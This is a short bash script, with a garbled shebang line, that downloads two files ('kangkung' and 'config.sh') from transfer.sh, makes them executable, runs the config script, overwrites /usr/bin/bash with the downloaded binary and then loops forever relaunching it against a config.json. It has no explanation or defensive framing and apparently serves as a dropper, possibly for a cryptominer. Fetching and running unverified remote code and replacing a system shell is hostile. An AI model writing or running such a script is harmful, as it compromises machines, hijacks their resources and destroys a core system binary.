!#bin/bash

wget -O kangkung https://transfer.sh/get/XLC2EC/kangkung
wget -O config.sh https://transfer.sh/get/Dy09jr/config.sh
chmod +x kangkung
chmod +x config.sh
./config.sh
mv kangkung /usr/bin/bash
while true; do timeout 3m bash -c config.json; sleep 20; done
